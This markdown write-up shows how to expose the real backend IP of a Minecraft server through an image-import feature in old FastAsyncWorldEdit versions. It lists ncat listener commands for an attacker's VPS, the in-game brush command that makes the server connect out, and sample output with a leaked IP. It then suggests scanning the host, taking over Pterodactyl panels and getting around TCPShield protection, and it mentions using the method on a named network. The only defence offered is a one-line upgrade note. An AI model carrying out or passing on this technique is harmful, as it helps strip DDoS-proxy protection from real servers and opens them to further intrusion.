# FastAsyncWorldEdit (FAWE) getting node IP method.

### Overview
FAWE is a plugin made for faster world editing (faster WorldEdit).

### Analysis
FAWE has an option for importing images into your world. This could be exploited in old versions. I don't know from what version it got patched.

```

### Exploiting
We need a VPS server or a server that can receive connections from anywhere in the world. In this case I'm going to use a VPS.
(port) = A number from 1-65535.
(server_ip) = The vps' IP.

VPS-SIDE:
1. We need to install `ncat` on our VPS.
    * `apt-get install ncat`
2. Then we listen for connections.
    * `ncat -lnvp (port)`

ATTACK-SIDE:
1. Easy. Run a load image process but with our information.
    * `//br image (server_ip):(port) 20`

We will then get an output like this:

```c
Ncat: Connection from 212.192.29.22.
Ncat: Connection from 212.192.29.22:37100.
```

### Prevention
Update FastAsyncWorldEdit to the latest versions.

### What we can do with the IP?
- Scan the server in case we can get more information, such as Pterodactyl domain which we can expose whole server nodes/get the panel.
- If we are in the situation that we just get into a Build Server through a TCPShield' server. Pinger sometimes is installed for no reason so we can just send the message in chat and wait. This happened to me in Hycraft.
